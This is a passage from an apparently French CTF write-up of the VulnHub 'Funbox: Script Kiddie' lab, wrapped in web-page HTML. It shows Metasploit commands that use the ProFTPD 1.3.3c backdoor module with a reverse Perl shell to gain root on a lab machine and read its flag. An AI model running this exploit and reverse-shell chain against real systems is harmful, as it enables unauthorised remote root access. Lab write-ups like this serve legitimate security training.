\u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E linux\u002Fremote\u002F15662.txt\nProFTPd-1.3.3c - Backdoor Command Execution \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003EMetasploit\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E|\u003C\u002Fspan\u003E linux\u002Fremote\u002F16921.rb\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn lance donc ce dernier via la commande \u003Cstrong\u003Emsfconsole\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ msfconsole\nmsf6 \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E search ProFTPd-1.3.3c\n\u003Cspan class=\"token comment\"\u003E#  Name                                    Disclosure Date  Rank       Check  Description\u003C\u002Fspan\u003E\n-  ----                                    ---------------  ----       -----  -----------\n\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E  exploit\u002Funix\u002Fftp\u002Fproftpd_133c_backdoor  \u003Cspan class=\"token number\"\u003E2010\u003C\u002Fspan\u003E-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn retrouve bien l'exploit que l'on veut utiliser.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E use \u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EAvant de poursuivre, on regarde les options disponibles.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fftp\u002Fproftpd_133c_backdoor\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E show options\nName    Current Setting  Required  Description\n----    ---------------  --------  -----------\nRHOSTS                   \u003Cspan class=\"token function\"\u003Eyes\u003C\u002Fspan\u003E       The target host\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Es\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E, range CIDR identifier, or hosts \u003Cspan class=\"token function\"\u003Efile\u003C\u002Fspan\u003E with syntax \u003Cspan class=\"token string\"\u003E'file:&lt;path\u003E'\u003C\u002Fspan\u003E\nRPORT   \u003Cspan class=\"token number\"\u003E21\u003C\u002Fspan\u003E               \u003Cspan class=\"token function\"\u003Eyes\u003C\u002Fspan\u003E       The target port \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003ETCP\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn commence par renseigner l'IP de la machine distante dans la variable \"RHOST\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fftp\u002Fproftpd_133c_backdoor\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E RHOST \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17\nRHOST \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis on consulte la liste des payloads disponibles.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fftp\u002Fproftpd_133c_backdoor\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E show payloads\n\u003Cspan class=\"token comment\"\u003E#  Name                                        Disclosure Date  Rank    Check  Description\u003C\u002Fspan\u003E\n-  ----                                        ---------------  ----    -----  -----------\n\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Fbind_perl                                   normal  No     Unix Command Shell, Bind TCP \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Evia Perl\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Fbind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Evia perl\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E IPv6\n\u003Cspan class=\"token number\"\u003E2\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Fgeneric                                     normal  No     Unix Command, Generic Command Execution\n\u003Cspan class=\"token number\"\u003E3\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Freverse                                     normal  No     Unix Command Shell, Double Reverse TCP \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Etelnet\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Freverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Etelnet\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E5\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Freverse_perl                                normal  No     Unix Command Shell, Reverse TCP \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Evia Perl\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E6\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Freverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Evia perl\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\u003Cspan class=\"token number\"\u003E7\u003C\u002Fspan\u003E  payload\u002Fcmd\u002Funix\u002Freverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Etelnet\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn choisit le reverse en PERL dans la variable \"payload\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fftp\u002Fproftpd_133c_backdoor\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E payload \u003Cspan class=\"token number\"\u003E5\u003C\u002Fspan\u003E\npayload \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E cmd\u002Funix\u002Freverse_perl\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEt on n'oublie pas de renseigner l'IP la machine locale dans la variable \"LHOST\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fftp\u002Fproftpd_133c_backdoor\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token builtin class-name\"\u003Eset\u003C\u002Fspan\u003E LHOST \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.33\nLHOST \u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.33\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ENos 3 valeurs renseign√©es, on peut ex√©cuter l'exploit.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003Emsf6 exploit\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eunix\u002Fftp\u002Fproftpd_133c_backdoor\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E exploit\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Started reverse TCP handler on \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.33:4444 \n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17:21 - Sending Backdoor Command\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Command shell session \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E opened \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.33:4444 -\u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E192.168\u003C\u002Fspan\u003E.1.17:44782\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E at \u003Cspan class=\"token number\"\u003E2021\u003C\u002Fspan\u003E-08-15 \u003Cspan class=\"token number\"\u003E10\u003C\u002Fspan\u003E:58:28 +0200\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EL'exploit fonctionne car on est connect√© sur le serveur \u003Cstrong\u003EFTP\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E,65534\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Enogroup\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn est directement utilisateur \u003Cstrong\u003Eroot\u003C\u002Fstrong\u003E. On lance un \u003Cstrong\u003Eshell\u003C\u002Fstrong\u003E pour mieux naviguer sur la machine distante.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ shell\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Trying to \u003Cspan class=\"token function\"\u003Efind\u003C\u002Fspan\u003E binary \u003Cspan class=\"token string\"\u003E'python'\u003C\u002Fspan\u003E on the target machine\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Found python at \u002Fusr\u002Fbin\u002Fpython\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Using \u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token variable\"\u003E`\u003C\u002Fspan\u003Epython\u003Cspan class=\"token variable\"\u003E`\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E to pop up an interactive shell\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Trying to \u003Cspan class=\"token function\"\u003Efind\u003C\u002Fspan\u003E binary \u003Cspan class=\"token string\"\u003E'bash'\u003C\u002Fspan\u003E on the target machine\n\u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003E*\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E Found \u003Cspan class=\"token function\"\u003Ebash\u003C\u002Fspan\u003E at \u002Fbin\u002Fbash\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn trouve l'unique flag dans le r√©pertoire de l'utilisateur \u003Cstrong\u003Eroot\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Froot\u002Froot.txt\nPlease, tweet this to: @0815R2d2\nThank you\u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Ffunbox-scriptkiddie,725","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":4,"parts":[{"title":"CTF Funbox: Easy","href":"ctf-funbox-easy"},{"title":"CTF Funbox: Script Kiddie","href":""}]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.8f509c54.js" defer></script><script src="/assets/js/page--src-templates-post-vue.12e71a8f.js" defer></script>
  </body>
</html>
